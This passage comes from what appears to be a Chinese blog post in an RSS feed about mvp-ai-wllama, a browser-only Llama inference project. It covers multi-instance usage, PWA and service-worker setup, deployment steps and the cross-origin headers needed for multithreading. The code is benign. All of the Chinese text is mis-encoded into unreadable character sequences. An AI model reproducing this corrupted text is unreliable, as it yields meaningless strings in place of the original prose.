<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { wllamaCoreFactory, <span class="hljs-variable constant_">WLLAMA_CONFIG_PATHS</span>, <span class="hljs-title class_">Message</span>, <span class="hljs-title class_">WllamaCoreEvent</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/wllama-core'</span>;

<span class="hljs-comment">// æ–¹å¼1: ä½¿ç”¨ getOrCreateï¼ˆæ¨èï¼Œå¦‚æœå®ä¾‹å·²å­˜åœ¨åˆ™è¿”å›ç°æœ‰å®ä¾‹ï¼‰</span>
<span class="hljs-keyword">const</span> instance1 = wllamaCoreFactory.<span class="hljs-title function_">getOrCreate</span>(<span class="hljs-string">'chat-1'</span>, { <span class="hljs-attr">paths</span>: <span class="hljs-variable constant_">WLLAMA_CONFIG_PATHS</span> });
<span class="hljs-keyword">const</span> instance2 = wllamaCoreFactory.<span class="hljs-title function_">getOrCreate</span>(<span class="hljs-string">'chat-2'</span>, { <span class="hljs-attr">paths</span>: <span class="hljs-variable constant_">WLLAMA_CONFIG_PATHS</span> });

<span class="hljs-comment">// æ–¹å¼2: ä½¿ç”¨ createï¼ˆå¦‚æœå®ä¾‹å·²å­˜åœ¨ä¼šæŠ›å‡ºé”™è¯¯ï¼‰</span>
<span class="hljs-comment">// const instance1 = wllamaCoreFactory.create({ paths: WLLAMA_CONFIG_PATHS }, 'chat-1');</span>

<span class="hljs-comment">// æ–¹å¼3: ä½¿ç”¨ getDefaultï¼ˆè·å–æˆ–åˆ›å»ºé»˜è®¤å®ä¾‹ï¼Œå‘åå…¼å®¹ï¼‰</span>
<span class="hljs-comment">// const defaultInstance = wllamaCoreFactory.getDefault({ paths: WLLAMA_CONFIG_PATHS });</span>

<span class="hljs-comment">// åŠ è½½ä¸åŒçš„æ¨¡å‹</span>
<span class="hljs-keyword">await</span> instance1.<span class="hljs-title function_">loadModelFromUrl</span>(<span class="hljs-string">'https://example.com/model1.gguf'</span>);
<span class="hljs-keyword">await</span> instance2.<span class="hljs-title function_">loadModelFromUrl</span>(<span class="hljs-string">'https://example.com/model2.gguf'</span>);

<span class="hljs-comment">// ç›‘å¬äº‹ä»¶ï¼ˆäº‹ä»¶æ•°æ®åŒ…å« instanceIdï¼‰</span>
instance1.<span class="hljs-title function_">on</span>(<span class="hljs-title class_">WllamaCoreEvent</span>.<span class="hljs-property">GENERATION_UPDATE</span>, <span class="hljs-function">(<span class="hljs-params">data: <span class="hljs-built_in">any</span></span>) =&gt;</span> {
  <span class="hljs-keyword">if</span> (data.<span class="hljs-property">instanceId</span> === <span class="hljs-string">'chat-1'</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'èŠå¤©1æ›´æ–°:'</span>, data.<span class="hljs-property">data</span>);
  }
});

instance2.<span class="hljs-title function_">on</span>(<span class="hljs-title class_">WllamaCoreEvent</span>.<span class="hljs-property">GENERATION_UPDATE</span>, <span class="hljs-function">(<span class="hljs-params">data: <span class="hljs-built_in">any</span></span>) =&gt;</span> {
  <span class="hljs-keyword">if</span> (data.<span class="hljs-property">instanceId</span> === <span class="hljs-string">'chat-2'</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'èŠå¤©2æ›´æ–°:'</span>, data.<span class="hljs-property">data</span>);
  }
});

<span class="hljs-comment">// åŒæ—¶è¿›è¡Œå¤šä¸ªå¯¹è¯</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">messages1</span>: <span class="hljs-title class_">Message</span>[] = [{ <span class="hljs-attr">role</span>: <span class="hljs-string">'user'</span>, <span class="hljs-attr">content</span>: <span class="hljs-string">'ä½ å¥½'</span> }];
<span class="hljs-keyword">const</span> <span class="hljs-attr">messages2</span>: <span class="hljs-title class_">Message</span>[] = [{ <span class="hljs-attr">role</span>: <span class="hljs-string">'user'</span>, <span class="hljs-attr">content</span>: <span class="hljs-string">'Hello'</span> }];

<span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([
  instance1.<span class="hljs-title function_">createChatCompletion</span>(messages1),
  instance2.<span class="hljs-title function_">createChatCompletion</span>(messages2),
]);

<span class="hljs-comment">// è·å–å®ä¾‹ä¿¡æ¯</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å®ä¾‹1 ID:'</span>, instance1.<span class="hljs-title function_">getInstanceId</span>());
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å½“å‰å®ä¾‹æ•°:'</span>, wllamaCoreFactory.<span class="hljs-title function_">getInstanceCount</span>());

<span class="hljs-comment">// æ¸…ç†</span>
<span class="hljs-keyword">await</span> wllamaCoreFactory.<span class="hljs-title function_">destroy</span>(<span class="hljs-string">'chat-1'</span>);
<span class="hljs-keyword">await</span> wllamaCoreFactory.<span class="hljs-title function_">destroy</span>(<span class="hljs-string">'chat-2'</span>);
<span class="hljs-comment">// æˆ–æ¸…ç†æ‰€æœ‰å®ä¾‹</span>
<span class="hljs-comment">// await wllamaCoreFactory.destroyAll();</span>
</code></pre>
<h3 data-id="heading-28">PWA å®‰è£…å’Œä½¿ç”¨</h3>
<p>é¡¹ç›®æ”¯æŒå®Œæ•´çš„ PWA åŠŸèƒ½ï¼Œç”¨æˆ·å¯ä»¥åƒå®‰è£…åŸç”Ÿåº”ç”¨ä¸€æ ·å®‰è£…ï¼š</p>
<p><strong>å®‰è£…æ­¥éª¤</strong>ï¼š</p>
<ol>
<li>
<p><strong>åœ¨æ¡Œé¢æµè§ˆå™¨</strong>ï¼š</p>
<ul>
<li>è®¿é—®åº”ç”¨åï¼Œæµè§ˆå™¨åœ°å€æ ä¼šæ˜¾ç¤ºå®‰è£…å›¾æ ‡</li>
<li>ç‚¹å‡»å®‰è£…å›¾æ ‡ï¼Œé€‰æ‹©"å®‰è£…"</li>
<li>åº”ç”¨ä¼šæ·»åŠ åˆ°æ¡Œé¢ï¼Œå¯ä»¥ç‹¬ç«‹çª—å£è¿è¡Œ</li>
</ul>
</li>
<li>
<p><strong>åœ¨ç§»åŠ¨è®¾å¤‡</strong>ï¼š</p>
<ul>
<li>iOS Safariï¼šç‚¹å‡»åˆ†äº«æŒ‰é’® â†’ "æ·»åŠ åˆ°ä¸»å±å¹•"</li>
<li>Android Chromeï¼šæµè§ˆå™¨ä¼šè‡ªåŠ¨æ˜¾ç¤º"æ·»åŠ åˆ°ä¸»å±å¹•"æ¨ªå¹…</li>
<li>å®‰è£…åï¼Œåº”ç”¨ä¼šå‡ºç°åœ¨ä¸»å±å¹•ä¸Š</li>
</ul>
</li>
</ol>
<p><strong>ç¦»çº¿ä½¿ç”¨</strong>ï¼š</p>
<ul>
<li>å®‰è£…åï¼Œåº”ç”¨çš„æ ¸å¿ƒåŠŸèƒ½å¯ä»¥åœ¨ç¦»çº¿çŠ¶æ€ä¸‹ä½¿ç”¨</li>
<li>å·²åŠ è½½çš„æ¨¡å‹æ–‡ä»¶å­˜å‚¨åœ¨ IndexedDB ä¸­ï¼Œç¦»çº¿æ—¶ä»å¯ä½¿ç”¨</li>
<li>Service Worker ä¼šç¼“å­˜è®¿é—®è¿‡çš„é¡µé¢ï¼Œç¦»çº¿æ—¶ä¹Ÿèƒ½æµè§ˆ</li>
</ul>
<p><strong>Service Worker ç®¡ç†</strong>ï¼š</p>
<p>é¡¹ç›®æä¾›äº† Service Worker ç®¡ç†åŠŸèƒ½ï¼Œå¯ä»¥é€šè¿‡ç»„ä»¶æ§åˆ¶ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// Service Worker åªåœ¨ PWA ç¯å¢ƒä¸‹è‡ªåŠ¨æ³¨å†Œ</span>
<span class="hljs-comment">// å¯ä»¥é€šè¿‡å…¨å±€æ–¹æ³•ç®¡ç†</span>
(<span class="hljs-variable language_">window</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>).<span class="hljs-property">swManager</span>.<span class="hljs-title function_">status</span>(); <span class="hljs-comment">// æŸ¥çœ‹çŠ¶æ€</span>
(<span class="hljs-variable language_">window</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>).<span class="hljs-property">swManager</span>.<span class="hljs-title function_">unregister</span>(); <span class="hljs-comment">// å¸è½½ Service Worker</span>
</code></pre>
<p><strong>PWA é…ç½®è¦ç‚¹</strong>ï¼š</p>
<ul>
<li><code>manifest.json</code> é…ç½®äº†åº”ç”¨çš„åŸºæœ¬ä¿¡æ¯ã€å›¾æ ‡å’Œæ˜¾ç¤ºæ¨¡å¼</li>
<li>Service Worker å®ç°äº†æ™ºèƒ½ç¼“å­˜ç­–ç•¥</li>
<li>æ”¯æŒè‡ªåŠ¨æ›´æ–°ï¼Œåå°æ£€æµ‹æ–°ç‰ˆæœ¬</li>
<li>åªåœ¨ PWA ç¯å¢ƒä¸‹æ³¨å†Œï¼Œé¿å…åœ¨æ™®é€šæµè§ˆå™¨ä¸­å ç”¨èµ„æº</li>
</ul>
<h3 data-id="heading-29">éReactç¯å¢ƒä½¿ç”¨</h3>
<p>æ ¸å¿ƒåº“ <code>wllama-core</code> ä¸ä¾èµ– Reactï¼Œå¯ä»¥åœ¨ä»»ä½• JavaScript/TypeScript ç¯å¢ƒä¸­ä½¿ç”¨ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// çº¯JavaScript/TypeScriptç¯å¢ƒ</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">WllamaCore</span>, <span class="hljs-variable constant_">WLLAMA_CONFIG_PATHS</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./wllama-core'</span>;

<span class="hljs-keyword">const</span> wllamaCore = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WllamaCore</span>({ <span class="hljs-attr">paths</span>: <span class="hljs-variable constant_">WLLAMA_CONFIG_PATHS</span> });

<span class="hljs-comment">// åŠ è½½æ¨¡å‹</span>
<span class="hljs-keyword">await</span> wllamaCore.<span class="hljs-title function_">loadModelFromFiles</span>(files, { <span class="hljs-attr">n_ctx</span>: <span class="hljs-number">4096</span> });

<span class="hljs-comment">// ç”Ÿæˆæ–‡æœ¬</span>
<span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> wllamaCore.<span class="hljs-title function_">createChatCompletion</span>([
  { <span class="hljs-attr">role</span>: <span class="hljs-string">'user'</span>, <span class="hljs-attr">content</span>: <span class="hljs-string">'ä½ å¥½ï¼'</span> }
], {
  <span class="hljs-attr">nPredict</span>: <span class="hljs-number">4096</span>,
  <span class="hljs-attr">sampling</span>: { <span class="hljs-attr">temp</span>: <span class="hljs-number">0.2</span> },
});

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result);
</code></pre>
<h2 data-id="heading-30">é¡¹ç›®ç»“æ„</h2>
<pre><code class="hljs language-csharp" lang="csharp">mvp-ai-wllama/
â”œâ”€â”€ src/
â”‚   â”œâ”€â”€ app/                    <span class="hljs-meta"># Next.js åº”ç”¨é¡µé¢</span>
â”‚   â”‚   â”œâ”€â”€ wllama/
â”‚   â”‚   â”‚   â”œâ”€â”€ load-<span class="hljs-keyword">from</span>-file/    <span class="hljs-meta"># ä»æ–‡ä»¶åŠ è½½é¡µé¢</span>
â”‚   â”‚   â”‚   â”œâ”€â”€ load-<span class="hljs-keyword">from</span>-url/     <span class="hljs-meta"># ä»URLåŠ è½½é¡µé¢</span>
â”‚   â”‚   â”‚   â”œâ”€â”€ load-<span class="hljs-keyword">from</span>-cache/   <span class="hljs-meta"># ä»ç¼“å­˜åŠ è½½é¡µé¢</span>
â”‚   â”‚   â”‚   â”œâ”€â”€ manager-cache/     <span class="hljs-meta"># ç¼“å­˜ç®¡ç†é¡µé¢</span>
â”‚   â”‚   â”‚   â””â”€â”€ multi-instance/     <span class="hljs-meta"># å¤šå®ä¾‹æ¼”ç¤ºé¡µé¢</span>
â”‚   â”‚   â””â”€â”€ layout.tsx             <span class="hljs-meta"># å¸ƒå±€ç»„ä»¶ï¼ˆåŒ…å« PWA manifest é…ç½®ï¼‰</span>
â”‚   â”œâ”€â”€ wllama-core/            <span class="hljs-meta"># æ ¸å¿ƒåº“ï¼ˆæ— Reactä¾èµ–ï¼‰</span>
â”‚   â”‚   â”œâ”€â”€ wllama-core.ts      <span class="hljs-meta"># æ ¸å¿ƒå°è£…ç±»</span>
â”‚   â”‚   â”œâ”€â”€ wllama-core-factory.ts <span class="hljs-meta"># å·¥å‚ç±»ï¼ˆå¤šå®ä¾‹ç®¡ç†ï¼‰</span>
â”‚   â”‚   â”œâ”€â”€ cache-manager.ts    <span class="hljs-meta"># ç¼“å­˜ç®¡ç†å™¨</span>
â”‚   â”‚   â”œâ”€â”€ storage.ts          <span class="hljs-meta"># localStorageå·¥å…·</span>
â”‚   â”‚   â”œâ”€â”€ utils.ts            <span class="hljs-meta"># å·¥å…·å‡½æ•°</span>
â”‚   â”‚   â”œâ”€â”€ types.ts            <span class="hljs-meta"># ç±»å‹å®šä¹‰</span>
â”‚   â”‚   â””â”€â”€ config.ts           <span class="hljs-meta"># é…ç½®</span>
â”‚   â””â”€â”€ components/             <span class="hljs-meta"># Reactç»„ä»¶</span>
â”‚       â”œâ”€â”€ StudioLayout/       <span class="hljs-meta"># å¸ƒå±€ç»„ä»¶</span>
â”‚       â”œâ”€â”€ Loading.tsx         <span class="hljs-meta"># åŠ è½½ç»„ä»¶</span>
â”‚       â”œâ”€â”€ ServiceWorkerManager.tsx <span class="hljs-meta"># Service Worker ç®¡ç†ç»„ä»¶</span>
â”‚       â””â”€â”€ ServiceWorkerUninstall.tsx <span class="hljs-meta"># Service Worker å¸è½½ç»„ä»¶</span>
â”œâ”€â”€ <span class="hljs-keyword">public</span>/
â”‚   â”œâ”€â”€ manifest.json          <span class="hljs-meta"># PWA æ¸…å•æ–‡ä»¶</span>
â”‚   â”œâ”€â”€ sw.js                  <span class="hljs-meta"># Service Worker æ–‡ä»¶</span>
â”‚   â”œâ”€â”€ icon<span class="hljs-number">-192.</span>png           <span class="hljs-meta"># PWA å›¾æ ‡ï¼ˆ192x192ï¼‰</span>
â”‚   â”œâ”€â”€ icon<span class="hljs-number">-512.</span>png           <span class="hljs-meta"># PWA å›¾æ ‡ï¼ˆ512x512ï¼‰</span>
â”‚   â””â”€â”€ wasm/
â”‚       â””â”€â”€ wllama/
â”‚           â”œâ”€â”€ multi-thread/   <span class="hljs-meta"># å¤šçº¿ç¨‹WASM</span>
â”‚           â””â”€â”€ single-thread/  <span class="hljs-meta"># å•çº¿ç¨‹WASM</span>
â””â”€â”€ src/middleware.ts          <span class="hljs-meta"># Next.jsä¸­é—´ä»¶ï¼ˆå¤šçº¿ç¨‹æ”¯æŒï¼‰</span>
</code></pre>
<h2 data-id="heading-31">éƒ¨ç½²æ–¹æ¡ˆ</h2>
<h3 data-id="heading-32">Vercelä¸€é”®éƒ¨ç½²</h3>
<p>é¡¹ç›®å·²é…ç½®ï¼Œå¯ç›´æ¥éƒ¨ç½²åˆ°Vercelï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å®‰è£…ä¾èµ–</span>
npm install

<span class="hljs-comment"># æ„å»ºé¡¹ç›®</span>
npm run build

<span class="hljs-comment"># Vercel ä¼šè‡ªåŠ¨æ£€æµ‹å¹¶éƒ¨ç½²</span>
</code></pre>
<p>ğŸŒ <strong>åœ¨çº¿æ¼”ç¤º</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fmvp-ai-wllama.vercel.app%2F" target="_blank" title="https://mvp-ai-wllama.vercel.app/" ref="nofollow noopener noreferrer">mvp-ai-wllama.vercel.app/</a></p>
<h3 data-id="heading-33">é™æ€æ–‡ä»¶éƒ¨ç½²</h3>
<p>é¡¹ç›®æ”¯æŒé™æ€å¯¼å‡ºï¼Œæ„å»ºåçš„æ–‡ä»¶å¯éƒ¨ç½²åˆ°ä»»ä½•é™æ€æ‰˜ç®¡æœåŠ¡ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ„å»ºé™æ€æ–‡ä»¶</span>
npm run build

<span class="hljs-comment"># è¾“å‡ºç›®å½•: out/</span>
<span class="hljs-comment"># å¯ç›´æ¥éƒ¨ç½²åˆ° GitHub Pagesã€Netlifyã€Nginx ç­‰</span>
</code></pre>
<h3 data-id="heading-34">å¤šçº¿ç¨‹æ”¯æŒé…ç½®</h3>
<p>å¦‚éœ€å¯ç”¨å¤šçº¿ç¨‹æ”¯æŒï¼Œéœ€è¦é…ç½®æ­£ç¡®çš„ HTTP å“åº”å¤´ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/middleware.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">middleware</span>(<span class="hljs-params">request: NextRequest</span>) {
  <span class="hljs-keyword">const</span> response = <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">next</span>();
  
  <span class="hljs-comment">// å¯ç”¨ SharedArrayBuffer æ”¯æŒ</span>
  response.<span class="hljs-property">headers</span>.<span class="hljs-title function_">set</span>(<span class="hljs-string">'Cross-Origin-Opener-Policy'</span>, <span class="hljs-string">'same-origin'</span>);
  response.<span class="hljs-property">headers</span>.<span class="hljs-title function_">set</span>(<span class="hljs-string">'Cross-Origin-Embedder-Policy'</span>, <span class="hljs-string">'require-corp'</span>);
  
  <span class="hljs-keyword">return</span> response;
}
</code></pre>
<p><strong>æ³¨æ„äº‹é¡¹</strong>ï¼š</p>
<ul>
<li>å¿…é¡»åœ¨ HTTPS ç¯å¢ƒä¸‹è¿è¡Œï¼ˆæˆ– localhostï¼‰</li>
<li>éœ€è¦æµè§ˆå™¨æ”¯æŒ SharedArrayBuffer</li>
<li>æŸäº›CDNå¯èƒ½ä¸æ”¯æŒè¿™äº›å“åº”å¤´ï¼Œéœ€è¦é…ç½®</li>
</ul>
<h2 data-id="heading-35">æŠ€æœ¯ä¼˜åŠ¿æ€»ç»“</h2>


















































<table><thead><tr><th>ç‰¹æ€§</th><th>ä¼ ç»Ÿæ–¹æ¡ˆ</th><th>æœ¬æ–¹æ¡ˆ</th></tr></thead><tbody><tr><td>æ•°æ®å®‰å…¨</td><td>âŒ éœ€è¦ä¸Šä¼ æœåŠ¡å™¨</td><td>âœ… å®Œå…¨æœ¬åœ°å¤„ç†</td></tr><tr><td>éƒ¨ç½²æˆæœ¬</td><td>âŒ éœ€è¦åç«¯æœåŠ¡</td><td>âœ… çº¯é™æ€éƒ¨ç½²</td></tr><tr><td>æ¨¡å‹æ ¼å¼</td><td>âš ï¸ éœ€è¦è½¬æ¢</td><td>âœ… ç›´æ¥æ”¯æŒGGUFæ ¼å¼</td></tr><tr><td>ç¦»çº¿ä½¿ç”¨</td><td>âŒ éœ€è¦ç½‘ç»œ</td><td>âœ… å®Œå…¨ç¦»çº¿</td></tr><tr><td>æ€§èƒ½ä¼˜åŒ–</td><td>âš ï¸ ä¾èµ–ç½‘ç»œ</td><td>âœ… IndexedDBç¼“å­˜ + å¤šçº¿ç¨‹</td></tr><tr><td>éšç§ä¿æŠ¤</td><td>âš ï¸ æ•°æ®ä¸Šä¼ </td><td>âœ… æ•°æ®ä¸å‡ºæµè§ˆå™¨</td></tr><tr><td>å‚æ•°æ§åˆ¶</td><td>âš ï¸ å¤æ‚é…ç½®</td><td>âœ… ç®€å•API + è‡ªåŠ¨æŒä¹…åŒ–</td></tr><tr><td>æµå¼è¾“å‡º</td><td>âš ï¸ éœ€è¦WebSocket</td><td>âœ… åŸç”Ÿæ”¯æŒæµå¼ç”Ÿæˆ</td></tr></tbody></table>
<h2 data-id="heading-36">æŠ€æœ¯åŸç†</h2>
<h3 data-id="heading-37">ä½¿ç”¨WebAssemblyè¿è¡ŒLlamaæ¨¡å‹</h3>
<p>ä¼ ç»ŸAIæ¨¡å‹æ¨ç†éœ€è¦ï¼š</p>
<ol>
<li>æ­å»ºGPUæœåŠ¡å™¨</li>
<li>é…ç½®CUDAç¯å¢ƒ</li>
<li>å¤„ç†æ¨¡å‹åŠ è½½å’Œæ¨ç†</li>
<li>ç®¡ç†æœåŠ¡å™¨èµ„æº</li>
</ol>
<p>æœ¬æ–¹æ¡ˆé€šè¿‡WebAssemblyæŠ€æœ¯ï¼š</p>
<ol>
<li>åœ¨æµè§ˆå™¨ä¸­ç›´æ¥è¿è¡ŒLlamaæ¨¡å‹æ¨ç†</li>
<li>ä½¿ç”¨WASMå®ç°é«˜æ€§èƒ½è®¡ç®—</li>
<li>å®Œå…¨å®¢æˆ·ç«¯åŒ–ï¼Œæ— éœ€æœåŠ¡å™¨</li>
<li>æ”¯æŒå¤šçº¿ç¨‹åŠ é€Ÿï¼ˆSharedArrayBufferï¼‰</li>
</ol>
<h3 data-id="heading-38">GGUFæ¨¡å‹æ ¼å¼</h3>
<p>GGUFï¼ˆGPT-Generated Unified Formatï¼‰æ˜¯ä¸“é—¨ä¸ºLlamaæ¨¡å‹è®¾è®¡çš„æ ¼å¼ï¼š</p>
<ul>
<li><strong>é‡åŒ–æ”¯æŒ</strong>ï¼šæ”¯æŒå¤šç§é‡åŒ–çº§åˆ«ï¼ˆQ4_K_M, Q8_0ç­‰ï¼‰</li>
<li><strong>å¿«é€ŸåŠ è½½</strong>ï¼šä¼˜åŒ–çš„æ–‡ä»¶ç»“æ„ï¼ŒåŠ è½½é€Ÿåº¦å¿«</li>
<li><strong>å†…å­˜æ•ˆç‡</strong>ï¼šé‡åŒ–åæ¨¡å‹ä½“ç§¯å¤§å¹…å‡å°</li>
<li><strong>è·¨å¹³å°</strong>ï¼šç»Ÿä¸€çš„æ ¼å¼ï¼Œè·¨å¹³å°å…¼å®¹</li>
</ul>
<h3 data-id="heading-39">IndexedDBç¼“å­˜æœºåˆ¶</h3>
<ul>
<li><strong>æŒä¹…åŒ–å­˜å‚¨</strong>ï¼šæ¨¡å‹æ–‡ä»¶å­˜å‚¨åœ¨æµè§ˆå™¨IndexedDBä¸­ï¼Œå…³é—­æµè§ˆå™¨åä»ä¿ç•™</li>
<li><strong>URLæ˜ å°„</strong>ï¼šä½¿ç”¨SHA-1å“ˆå¸Œå°†URLæ˜ å°„ä¸ºå”¯ä¸€æ–‡ä»¶å</li>
<li><strong>è¿›åº¦è¿½è¸ª</strong>ï¼šæ”¯æŒä¸‹è½½è¿›åº¦å®æ—¶åé¦ˆ</li>
<li><strong>å…ƒæ•°æ®æ‰©å±•</strong>ï¼šå¯æ‰©å±•çš„å…ƒæ•°æ®ç»“æ„ï¼Œæ”¯æŒETagã€åˆ›å»ºæ—¶é—´ç­‰</li>
</ul>
<h3 data-id="heading-40">å¤šçº¿ç¨‹åŠ é€ŸåŸç†</h3>
<ul>
<li><strong>SharedArrayBuffer</strong>ï¼šå…è®¸å¤šä¸ªWeb Workerå…±äº«å†…å­˜</li>
<li><strong>è‡ªåŠ¨æ£€æµ‹</strong>ï¼šè‡ªåŠ¨æ£€æµ‹æµè§ˆå™¨æ˜¯å¦æ”¯æŒå¤šçº¿ç¨‹</li>
<li><strong>æ€§èƒ½æå‡</strong>ï¼šå¤šçº¿ç¨‹æ¨¡å¼ä¸‹æ¨ç†é€Ÿåº¦å¯æå‡2-4å€</li>
<li><strong>å®‰å…¨é™åˆ¶</strong>ï¼šéœ€è¦è®¾ç½®COOP/COEPå“åº”å¤´</li>
</ul>
<h3 data-id="heading-41">å‚è€ƒé¡¹ç›®</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Frahuldshetty%2Fwllama" target="_blank" title="https://github.com/rahuldshetty/wllama" ref="nofollow noopener noreferrer">wllama</a> - WebAssembly Llamaè¿è¡Œæ—¶</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fggerganov%2Fllama.cpp" target="_blank" title="https://github.com/ggerganov/llama.cpp" ref="nofollow noopener noreferrer">llama.cpp</a> - Llamaæ¨¡å‹C++å®ç°</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fggerganov%2Fggml%2Fblob%2Fmaster%2Fdocs%2Fgguf.md" target="_blank" title="https://github.com/ggerganov/ggml/blob/master/docs/gguf.md" ref="nofollow noopener noreferrer">GGUF</a> - GGUFæ ¼å¼è§„èŒƒ</li>
</ul>
<h2 data-id="heading-42">å¼€æºåœ°å€</h2>
<p>ğŸ”— <strong>GitHubä»“åº“</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Felectroluxcode%2Fmvp-ai-wllama" target="_blank" title="https://github.com/electroluxcode/mvp-ai-wllama" ref="nofollow noopener noreferrer">mvp-ai-wllama</a></p>
<h2 data-id="heading-43">æ€»ç»“</h2>
<p>æœ¬é¡¹ç›®æä¾›äº†ä¸€ä¸ªå®Œæ•´çš„çº¯å‰ç«¯Llamaæ¨¡å‹æ¨ç†æ–¹æ¡ˆï¼Œé€šè¿‡WebAssemblyæŠ€æœ¯å®ç°äº†æ¨¡å‹æ¨ç†çš„æœ¬åœ°åŒ–ï¼Œç»“åˆReactå’Œç°ä»£åŒ–çš„ç¼“å­˜ç³»ç»Ÿï¼Œæ‰“é€ äº†ä¸€ä¸ªåŠŸèƒ½å®Œå–„ã€æ€§èƒ½ä¼˜ç§€çš„AIå¯¹è¯åº”ç”¨ã€‚</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>ï¼š</p>
<ul>
<li>ğŸš€ çº¯å‰ç«¯æ¶æ„ï¼Œæ— éœ€åç«¯æœåŠ¡</li>
<li>ğŸ”’ æ•°æ®å®Œå…¨æœ¬åœ°åŒ–ï¼Œä¿æŠ¤éšç§å®‰å…¨</li>
<li>âš¡ åŸºäºWebAssemblyçš„é«˜æ€§èƒ½æ¨ç†</li>
<li>ğŸ’¾ IndexedDBç¼“å­˜ç³»ç»Ÿï¼Œæ”¯æŒå¤§æ–‡ä»¶å­˜å‚¨</li>
<li>ğŸ”„ æµå¼ç”Ÿæˆæ”¯æŒï¼Œå®æ—¶è¾“å‡º</li>
<li>ğŸ§µ å¤šçº¿ç¨‹åŠ é€Ÿï¼Œæ€§èƒ½æå‡æ˜¾è‘—</li>
<li>ğŸ”€ å¤šå®ä¾‹æ”¯æŒï¼Œå¯åŒæ—¶è¿è¡Œå¤šä¸ªæ¨¡å‹å®ä¾‹</li>
<li>ğŸ“± PWA æ”¯æŒï¼Œå¯å®‰è£…åˆ°è®¾å¤‡ï¼Œæ”¯æŒç¦»çº¿ä½¿ç”¨</li>
<li>ğŸ“¦ é›¶Reactä¾èµ–çš„æ ¸å¿ƒåº“ï¼Œå¯æ¥å…¥ä»»ä½•ç³»ç»Ÿ</li>
<li>ğŸ¯ å®Œæ•´çš„ç±»å‹å®šä¹‰ï¼Œå¼€å‘ä½“éªŒä¼˜ç§€</li>
</ul>
<p>æ¬¢è¿Starå’ŒForkï¼Œä¸€èµ·æ¨åŠ¨å‰ç«¯AIæŠ€æœ¯çš„å‘å±•ï¼</p>
<hr/>
<p><strong>ç›¸å…³é˜…è¯»</strong>ï¼š</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Frahuldshetty%2Fwllama" target="_blank" title="https://github.com/rahuldshetty/wllama" ref="nofollow noopener noreferrer">wllama å®˜æ–¹æ–‡æ¡£</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwebassembly.org%2F" target="_blank" title="https://webassembly.org/" ref="nofollow noopener noreferrer">WebAssembly å®˜æ–¹æ–‡æ¡£</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FAPI%2FIndexedDB_API" target="_blank" title="https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API" ref="nofollow noopener noreferrer">IndexedDB API æ–‡æ¡£</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fnextjs.org%2Fdocs%2Fapp%2Fbuilding-your-application%2Fdeploying%2Fstatic-exports" target="_blank" title="https://nextjs.org/docs/app/building-your-application/deploying/static-exports" ref="nofollow noopener noreferrer">Next.js é™æ€å¯¼å‡º</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue å“åº”å¼åŸç†æ·±åº¦è§£æ]]></title>    <link>https://juejin.cn/post/7592768559170256922</link>    <guid>https://juejin.cn/post/7592768559170256922</guid>    <pubDate>2026-01-08T08:57:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592768559170256922" data-draft-id="7592768559170191386" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue å“åº”å¼åŸç†æ·±åº¦è§£æ"/> <meta itemprop="keywords" content="å‰ç«¯,Vue.js"/> <meta itemprop="datePublished" content="2026-01-08T08:57:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ»¡å¤©æ˜Ÿè¾°"/> <meta itemprop="url" content="https://juejin.cn/user/2771198801097485"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" 